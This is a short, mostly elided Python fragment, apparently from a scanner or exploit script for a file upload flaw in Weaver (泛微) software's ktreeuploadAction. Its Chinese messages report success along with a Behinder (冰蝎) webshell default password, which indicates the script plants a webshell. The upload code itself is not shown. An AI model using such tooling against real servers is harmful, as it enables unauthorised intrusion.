...
def main(target_url):
    ...
    console.print(now_time() + " [INFO]     正在检测ktreeuploadAction文件上传漏洞", style='bold blue')
    try:
        ...
        if upload.status_code == 200 and 'SUCCESS' in upload.text:
            ...
            console.print(now_time() + ' [SUCCESS]  泛微ktreeuploadAction文件上传漏洞存在,冰蝎默认密码', style='bold green')
            console.print(now_time() + ' [SUCCESS]  返回数据库包为{}:.format(upload.text)', style='bold green')
